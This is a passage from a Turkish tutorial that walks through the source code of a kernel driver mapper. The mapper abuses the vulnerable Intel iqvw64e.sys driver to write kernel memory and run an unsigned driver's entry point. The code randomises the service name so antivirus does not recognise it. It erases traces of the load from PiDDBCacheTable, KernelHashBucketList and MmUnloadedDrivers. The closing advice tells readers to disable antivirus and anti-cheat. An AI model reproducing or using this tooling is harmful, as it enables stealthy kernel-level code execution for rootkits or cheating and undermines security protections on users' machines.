    auto local_section = reinterpret_cast<void*>(reinterpret_cast<ULONG64>(local_image_base) + current_image_section[i].VirtualAddress);
    memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<ULONG64>(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
}
```

Şimdi her section'ı kopyalıyoruz.

`for` döngüsü tüm section'lar üzerinde dolaşıyor (`.text`, `.data`, vb.).

`Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA`: Eğer bu section uninitialized data (.bss) ise, atla. Çünkü kopyalanacak bir veri yok, sadece sıfır.

`continue`: Döngünün sonraki iterasyonuna geç.

`local_section`: Section'un yerel bellekteki yerine pointer. ImageBase + VirtualAddress.

`memcpy(local_section, kaynak, boyut)`: Section'u kopyala.

Kaynak: `data + PointerToRawData`. Yani dosyadaki section verisinin başlangıcı.

Boyut: `SizeOfRawData`. Section'un dosyadaki boyutu.

```cpp
ULONG64 realBase = kernel_image_base;
if (destroyHeader)
{
    kernel_image_base -= TotalVirtualHeaderSize;
    ss << "Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header";
    Log::Fine(ss.str());
    ss.str("");
}
```

`realBase`: Asıl çekirdek adresini sakla.

Eğer header silinecekse, kernel_image_base'i header boyutu kadar geri çek. Bu sayede relocation hesabı doğru çıkar.

```cpp
RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);
```

Relocation yap! Delta = kernel_image_base - ImageBase.

```cpp
if (!FixSecurityCookie(local_image_base, kernel_image_base ))
{
    Log::Error("Failed to fix cookie", false);
    return 0;
}
```

Stack cookie'yi düzelt.

```cpp
if (!ResolveImports(portable_executable::GetImports(local_image_base)))
{
    Log::Error("Failed to resolve imports", false);
    kernel_image_base = realBase;
    break;
}
```

Import'ları çöz. Başarısızsa, realBase'i geri al ve do-while'dan çık.

```cpp
if (!intel_driver::WriteMemory(realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) 
{
    Log::Error("Failed to write local image to remote image", false);
    kernel_image_base = realBase;
    break;
}
```

Hazır image'ı çekirdek belleğine yaz!

`WriteMemory`: Intel driver vasıtasıyla çekirdek belleğine yazar. Parametreleri:
1. `realBase`: Çekirdekte hedef adres.
2. Yerel bellek + (header siliyorsak) header offset.
3. Yazılacak boyut.

```cpp
// (Burada AllocationMode::AllocateIndependentPages için protection setup kodu var)

if (callback && !callback(nullptr, nullptr, realBase, image_size)) {
    Log::Error("Callback returned false");
    kernel_image_base = realBase;
    break;
}
```

Eğer callback varsa onu çağır. False dönerse iptal et.

```cpp
ULONG64 address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

NTSTATUS status = 0;
if (!intel_driver::CallKernelFunction(&status, address_of_entry_point, PassAllocationAddressAsFirstParam ? realBase : 0, 0)) {
    Log::Error("Failed to call C2C kernel entry", false);
    kernel_image_base = realBase;
    break;
}

if (exitCode)
    *exitCode = status;
```

Driver'ın entry point'ini çağır!

`address_of_entry_point`: Entry point'in çekirdek belleğindeki adresi. ImageBase + AddressOfEntryPoint.

`CallKernelFunction`: Intel driver ile, çekirdekte bir fonksiyon çağırır.

Parametre 1: status'un yazılacağı yer.
Parametre 2: Çağrılacak adres.
Parametre 3: 1. parametre (RCX register).
Parametre 4: 2. parametre (RDX register).

Eğer `exitCode` parametresi verilmişse, status'u oraya yaz.

```cpp
} while (false);

VirtualFree(local_image_base, 0, MEM_RELEASE);

if (free && kernel_image_base) {
    if (mode == AllocationMode::AllocateIndependentPages) {
        intel_driver::MmFreeIndependentPages(realBase, image_size);
    } else {
        intel_driver::FreePool(realBase);
    }
}

return realBase;
}
```

Temizlik:
- Yerel belleği serbest bırak.
- Eğer `free` parametresi true ve mapping başarılıysa, çekirdek belleğini de serbest bırak.

`return realBase`: Çekirdekteki gerçek adresi döndür.

---

# BÖLÜM 4: intel_driver.cpp - INTEL DRIVER İLE KONUŞMA

## 4.1 Bu Dosyanın Amacı

Intel driver ile konuşmak için kullanılan tüm fonksiyonlar bu dosyada. Yapacağı işler:
1. Intel driver'ı dosya sistemine yaz
2. Service olarak kaydet ve başlat
3. Cihaza handle aç
4. Çekirdek belleğini oku/yaz
5. Çekirdekte fonksiyon çağır
6. Çekirdek modüllerinde fonksiyon ara

## 4.2 IOCTL Kavramı

Çekirdekte bir driver ile kullanıcı modu programı arasında konuşmak için **IOCTL** (Input/Output Control) kullanılır. IOCTL, "şu komutu uygula, şu girdi var, şu çıktıyı bekliyorum" demektir.

`DeviceIoControl` fonksiyonu IOCTL gönderir. Parametreleri:
1. Cihaz handle'ı
2. IOCTL kodu (komut)
3. Girdi tamponu
4. Girdi boyutu
5. Çıktı tamponu
6. Çıktı boyutu
7. Yazılan byte sayısı (out)
8. Async olarak overlapped yapı (genelde nullptr)

## 4.3 Komut Yapıları

```cpp
typedef struct _COPY_MEMORY_BUFFER_INFO
{
    uint64_t case_number;
    uint64_t reserved;
    uint64_t source;
    uint64_t destination;
    uint64_t length;
} COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;
```

Bu Intel driver'ın bellek kopyalama IOCTL'i için kullandığı struct. 5 alanı var:
- `case_number`: Hangi alt-komut (mesela kernel-to-user, user-to-kernel)
- `reserved`: Ayrılmış (kullanılmıyor)
- `source`: Kaynak adres
- `destination`: Hedef adres
- `length`: Boyut

`typedef struct ...`: C tarzında struct tanımı. Hem `_COPY_MEMORY_BUFFER_INFO` adıyla, hem `COPY_MEMORY_BUFFER_INFO` adıyla, hem de `PCOPY_MEMORY_BUFFER_INFO` (pointer versiyonu) adıyla erişilebilir.

## 4.4 GetDriverNameW() - Rastgele Driver Adı Üret

```cpp
std::wstring intel_driver::GetDriverNameW() {
    if (cachedDriverName.empty()) {
        char buffer[100]{};
        static const char alphanum[] =
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        int len = rand() % 20 + 10;
        for (int i = 0; i < len; ++i)
            buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
        cachedDriverName = buffer;
    }

    std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
    return name;
}
```

Bu fonksiyon driver'ın service adını rastgele üretir. Niye? Çünkü sabit bir ad olsaydı, antivirus programları onu tanırdı.

`char buffer[100]{}`: 100 elemanlı char dizisi. `{}` ile sıfırla.

`static const char alphanum[] = "..."`: Statik sabit char dizisi. Harfleri içeriyor.

`rand() % 20 + 10`: 10 ile 29 arasında rastgele bir sayı. `rand()` rastgele sayı üretir, `% 20` 0-19 arasına indirir, `+ 10` 10-29 arasına çıkarır.

`buffer[i] = alphanum[...]`: i'inci karakter olarak alphanum'dan rastgele bir harf seç.

`cachedDriverName = buffer;`: Üretilen adı sakla. `cached` çünkü bir defa üretip sonra tekrar tekrar kullanacağız.

`std::wstring name(cachedDriverName.begin(), cachedDriverName.end());`: char string'i wide string'e dönüştür.

## 4.5 Load() - Intel Driver Yükle

```cpp
NTSTATUS intel_driver::Load() {
    srand((unsigned)time(NULL) * GetCurrentThreadId());
```

`srand`: Rastgele sayı üretecinin başlangıç değerini ayarla. Eğer hep aynı seed kullanırsak hep aynı rastgele sayılar gelir.

`time(NULL)`: Mevcut zaman (saniye).
`GetCurrentThreadId()`: Mevcut thread ID.

Bunları çarparak iyi bir seed oluşturuyoruz.

```cpp
if (intel_driver::IsRunning())
{
    Log::Error("\\Device\\Nal is already in use...");
    return STATUS_ALREADY_REGISTERED;
}
```

Intel driver zaten yüklü mü kontrol et. Yüklüyse hata.

```cpp
Log::Info("Loading intel driver");

std::wstring driver_path = GetDriverPath();
if (driver_path.empty())
{
    Log::Error("Can't find TEMP folder", false);
    return STATUS_UNSUCCESSFUL;
}

_wremove(driver_path.c_str());
```

Driver'ın yazılacağı yolu al. Bu genelde TEMP klasörü içinde.

`_wremove`: Wide character versiyonu remove. Eğer dosya zaten varsa sil.

```cpp
if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
    Log::Error("Failed to create vulnerable driver file", false);
    return STATUS_DISK_OPERATION_FAILED;
}
```

`intel_driver_resource::driver`: Intel driver binary'si, projeye gömülü olarak.

`CreateFileFromMemory`: Bellekteki veriyi dosyaya yaz.

`reinterpret_cast<const char*>(...)`: Tipi const char* olarak yorumla.

```cpp
auto status = AcquireDebugPrivilege();
if (!NT_SUCCESS(status)) {
    Log::Error("Failed to acquire SeDebugPrivilege", false);
    _wremove(driver_path.c_str());
    return status;
}
```

`SeDebugPrivilege`: Windows'un debug yetkisi. Bu yetki olmazsa bazı şeyleri yapamayız.

```cpp
status = service::RegisterAndStart(driver_path, GetDriverNameW());
if (!NT_SUCCESS(status)) {
    Log::Error("Failed to register and start service for the vulnerable driver", false);
    _wremove(driver_path.c_str());
    return status;
}
```

Driver'ı service olarak kaydet ve başlat. Detayını sonra göreceğiz.

```cpp
hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
{
    Log::Error("Failed to load driver iqvw64e.sys", false);
    intel_driver::Unload();
    return STATUS_NOT_FOUND;
}
```

`\\\\.\\Nal`: Intel driver'ın oluşturduğu cihazın adı. Bunu açıyoruz.

`hDevice` artık Intel driver ile konuşmamızı sağlayacak handle.

```cpp
ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
if (ntoskrnlAddr == 0)
{
    Log::Error("Failed to get ntoskrnl.exe", false);
    intel_driver::Unload();
    return STATUS_BAD_DLL_ENTRYPOINT;
}
```

ntoskrnl.exe'nin çekirdek belleğindeki adresini bul. Bu Windows'un çekirdeği.

```cpp
IMAGE_DOS_HEADER dosHeader = { 0 };
if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
    Log::Error("Can't exploit intel driver, is there any antivirus or anticheat running?", false);
    intel_driver::Unload();
    return STATUS_INVALID_IMAGE_FORMAT;
}
```

Test: ntoskrnl'in DOS header'ını oku. "MZ" (IMAGE_DOS_SIGNATURE) olmalı.

Eğer okuyamazsak veya yanlış değer çıkarsa, antivirus/anticheat blokluyor.

```cpp
if (!intel_driver::ClearPiDDBCacheTable()) { ... }
if (!intel_driver::ClearKernelHashBucketList()) { ... }
if (!intel_driver::ClearMmUnloadedDrivers()) { ... }
```

Bu fonksiyonlar Windows'un izlerini siler:
- **PiDDBCacheTable**: Yüklenmiş driver'ların önbelleği. Buradan silersek, Windows bizi unutur.
- **KernelHashBucketList**: Driver'ların hash listesi.
- **MmUnloadedDrivers**: Daha önce kaldırılmış driver'ların listesi.

## 4.6 ReadMemory() - Çekirdek Belleğini Oku

```cpp
bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
    return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
}
```

Sadece MemCopy'yi çağırıyor. Çekirdekten okumak, bellek kopyalama gibidir.

## 4.7 WriteMemory() - Çekirdek Belleğine Yaz

```cpp
bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
    return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}
```

Aynı şekilde, sadece kaynak/hedef değişmiş.

## 4.8 MemCopy() - Esas Bellek Kopyalama

```cpp
bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
    COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

    copy_memory_buffer.case_number = 0x33;
    copy_memory_buffer.source = source;
    copy_memory_buffer.destination = destination;
    copy_memory_buffer.length = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}
```

Komut struct'ını doldur:
- `case_number = 0x33`: Bu Intel driver'ın bellek kopyalama alt-komutu.
- Kaynak, hedef, boyut.

Sonra IOCTL gönder.

`DeviceIoControl`: Cihaza komut gönder.

Parametreleri:
1. `hDevice`: Açtığımız handle.
2. `ioctl1`: IOCTL kodu (Intel driver'a özel).
3. `&copy_memory_buffer`: Girdi.
4. `sizeof(copy_memory_buffer)`: Girdi boyutu.
5. `nullptr, 0`: Çıktı yok.
6. `&bytes_returned`: Geri dönen byte sayısı.
7. `nullptr`: Senkron.

## 4.9 CallKernelFunction() - Çekirdek Fonksiyonu Çağır

Bu çok ilginç bir fonksiyon! Intel driver'ı kullanarak çekirdekte istediğimiz herhangi bir fonksiyonu çağırabiliyoruz.

Mantığı şu: Intel driver'ın bir IOCTL'i var ki belirtilen fiziksel adresteki bir bellek alanını eşleştirip okuyor. Biz bu mekanizmayı manipüle ederek, çekirdekte fonksiyon çağırıyoruz.

Detayı çok karmaşık (PTE manipülasyonu, sayfa tablosu hile yapma), ama kullanımı basit:

```cpp
bool intel_driver::CallKernelFunction(NTSTATUS* result, ULONG64 address, ULONG64 param1, ULONG64 param2) {
```

Parametreler:
- `result`: Sonucun yazılacağı yer.
- `address`: Çağrılacak fonksiyonun adresi.
- `param1`, `param2`: Fonksiyonun ilk iki parametresi.

İçinde fonksiyon adresine git, parametreleri register'lara koy ve çağır mantığı var. Detaya girmiyorum çünkü çok karmaşık.

---

# BÖLÜM 5: service.cpp - DRIVER'I REGISTRY'YE KAYDET

## 5.1 Genel Amaç

Bir driver'ı yüklemek için Windows'a "şu yola bak, orada driver var, onu yükle" demek lazım. Bu da registry'de bir service oluşturmakla yapılır.

## 5.2 RegisterAndStart() - Kaydet ve Başlat

```cpp
NTSTATUS service::RegisterAndStart(const std::wstring& driver_path, const std::wstring& service_name)
{
    std::wstring services_path = L"SYSTEM\\CurrentControlSet\\Services\\" + service_name;
```

Service'in registry yolunu oluştur.

`L"SYSTEM\\CurrentControlSet\\Services\\"`: Sabit kısım.
`+ service_name`: Bizim service adımızı ekle.

```cpp
HKEY service_key;
LSTATUS reg_status = RegCreateKeyW(HKEY_LOCAL_MACHINE, services_path.c_str(), &service_key);
```

Registry anahtarını oluştur.

`services_path.c_str()`: std::wstring'i C tarzı pointer'a dönüştür.

```cpp
std::wstring image_path = L"\\??\\" + driver_path;
reg_status = RegSetKeyValueW(service_key, NULL, L"ImagePath", REG_EXPAND_SZ, image_path.c_str(), (DWORD)(image_path.size() * sizeof(wchar_t)));
```

`\\??\\`: NT path öneki. Driver yolunu Windows iç formatına çevir.

`RegSetKeyValueW`: Registry'ye değer yaz.

Parametreleri:
1. Anahtar.
2. Subkey (yok).
3. Value adı: "ImagePath".
4. Tip: REG_EXPAND_SZ (genişletilebilir string).
5. Veri.
6. Veri boyutu (byte cinsinden).

```cpp
const DWORD type_value = 1;
reg_status = RegSetKeyValueW(service_key, NULL, L"Type", REG_DWORD, &type_value, sizeof(DWORD));
```

Type = 1: Kernel driver demek (Type = 2 file system, Type = 16 service vs.).

```cpp
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
BOOLEAN SeLoadDriverWasEnabled;
NTSTATUS ntStatus = nt::RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
```

`RtlAdjustPrivilege`: Belirli bir yetkiyi etkinleştir/devre dışı bırak.

`SE_LOAD_DRIVER_PRIVILEGE`: Driver yükleme yetkisi.

Eğer bu yetki yoksa, Administrator olarak çalıştırmıyorsundur.

```cpp
std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + service_name;
UNICODE_STRING serviceStr;
RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

ntStatus = nt::NtLoadDriver(&serviceStr);
```

`NtLoadDriver`: Asıl driver yükleme fonksiyonu. Düşük seviye Windows API'si.

`UNICODE_STRING`: NT API'sinin kullandığı string tipi.

`RtlInitUnicodeString`: Bu struct'ı initialize et.

---

# BÖLÜM 6: PRATIK ÖRNEK - PROGRAMI ÇALIŞTIRMAK

## 6.1 Akış Özeti

Programı çalıştırdığında şunlar olur:

1. **Başlangıç**: Crash handler ayarlanır, parametreler okunur.
2. **Kontroller**: Driver zaten yüklü mü? Windows ayarları nasıl?
3. **Hazırlık**: Şifreli driver decrypt edilir.
4. **Intel Driver**: TEMP'e yazılır, service olarak kaydedilir, başlatılır, cihaz açılır.
5. **Çekirdek Belleği**: Intel driver vasıtasıyla çekirdekte yer ayrılır.
6. **PE Hazırlığı**: Driver yerel belleğe kopyalanır, relocation yapılır, cookie düzeltilir, import'lar çözülür.
7. **Yazma**: Hazır image çekirdek belleğine yazılır.
8. **Çalıştırma**: Driver entry point çağrılır.
9. **Temizlik**: Intel driver kaldırılır.
10. **Bitiş**: Başarı mesajı.

## 6.2 Hata Durumları

Olası hatalar:
- **"Failed to connect to intel driver"**: Antivirus/anticheat blokluyor veya admin değilsin.
- **"Failed to allocate remote image in kernel"**: Çekirdek belleği yetersiz.
- **"Failed to fix cookie"**: PE dosyası bozuk.
- **"Failed to resolve imports"**: Driver var olmayan bir fonksiyon kullanıyor.

## 6.3 Tavsiyeler

1. Her zaman Administrator olarak çalıştır.
2. Antivirus'ü geçici olarak kapat.
3. Anti-cheat servislerini durdur.
4. `/forceprefs` parametresi ile Windows ayarlarını düzelt.
5. Bilgisayarı yeniden başlat (gerektiğinde).

---

# SONSÖZ

Bu rehberi okuyarak C2C kernel mapper'ının nasıl çalıştığını öğrendin. Önemli kavramlar:

- **Ring 0 ve Ring 3**: Çekirdek modu ve kullanıcı modu.
- **PE Format**: Windows executable formatı.
- **Relocation**: Adres değişikliklerini düzeltme.
- **Import Address Table**: Dış fonksiyonların adreslerinin tablosu.
- **Stack Cookie**: Buffer overflow koruması.
- **IOCTL**: Cihazlarla konuşma yöntemi.
- **Manual Mapping**: Driver'ı Windows'a haber vermeden yükleme.

Eğer bir yerde takıldıysan, oradaki kodu tekrar oku, anlamadığın kısımları araştır. Programlamayı öğrenmek bir maraton, sürat koşusu değil. Sabırlı ol, devam et.

Başarılar! 🚀
